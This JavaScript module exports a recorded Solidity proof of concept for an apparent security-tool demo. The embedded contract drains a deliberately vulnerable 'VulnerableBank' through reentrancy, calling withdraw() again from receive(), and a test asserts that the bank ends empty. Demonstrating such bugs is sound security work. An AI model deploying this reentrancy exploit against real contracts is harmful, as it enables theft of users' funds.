'use strict';

// Recorded exploit trace for the seeded VulnerableBank demo.
// Used verbatim in demo mode (no LLM key). Kept forge-std free so
// `forge test` runs offline with no dependency install.
const RECORDED_POC = `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "../src/VulnerableBank.sol";

/// @notice Exploit contract: deposits 1 ether, then re-enters withdraw()
///         from receive() until the bank is drained.
contract Attacker {
    VulnerableBank public immutable bank;

    constructor(address payable bankAddress) {
        bank = VulnerableBank(bankAddress);
    }

    function attack() external payable {
        require(msg.value == 1 ether, "seed 1 ether");
        bank.deposit{value: 1 ether}();
        bank.withdraw();
    }

    receive() external payable {
        if (address(bank).balance >= 1 ether) {
            bank.withdraw();
        }
    }
}

contract ReentrancyPoC {
    VulnerableBank internal bank;
    uint256 internal constant SEED = 1 ether;

    function setUp() public {
        bank = new VulnerableBank();
        // Bank starts funded with 10 ether of other users' deposits.
        payable(address(bank)).transfer(10 ether);
    }

    function testReentrancyDrainsBank() public {
        Attacker attacker = new Attacker(payable(address(bank)));

        attacker.attack{value: SEED}();

        // Attacker deposited 1 ether and walked away with everything.
        assert(address(attacker).balance > SEED);
        assert(address(bank).balance == 0);
    }
}
`;

module.exports = { RECORDED_POC };
